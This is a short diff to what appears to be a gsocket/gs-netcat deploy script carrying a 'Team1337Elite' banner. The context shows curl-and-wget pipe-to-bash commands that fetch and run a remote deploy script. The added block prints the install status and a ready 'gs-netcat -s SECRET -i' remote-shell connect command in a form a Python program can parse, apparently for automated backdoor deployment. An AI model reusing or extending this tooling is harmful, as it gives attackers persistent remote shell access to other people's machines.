@@ -2148,7 +2148,19 @@ gs_start
     ${CM}${str}bash -c \"\$(curl -fsSL ${url}/${SCRIPT_DEPLOY_NAME})\"${CN}
     ${CM}${str}bash -c \"\$(wget -qO-  ${url}/${SCRIPT_DEPLOY_NAME})\"${CN}"
 }
-
 echo -e "--> ${CW}Team1337Elite${CN}"
 
+# ============================================================
+# OUTPUT KONSISTEN UNTUK PYTHON
+# ============================================================
+if [[ -n "$GS_SECRET" ]] && [[ -n "$IS_GS_RUNNING" ]] || [[ -n "$IS_INSTALLED" ]]; then
+    echo "GS_INSTALL_STATUS: SUCCESS"
+    echo "GS_COMMAND: gs-netcat -s \"$GS_SECRET\" -i"
+else
+    echo "GS_INSTALL_STATUS: FAILED"
+    echo "GS_COMMAND: N/A"
+fi
+# ============================================================
+
 exit_code 0
+
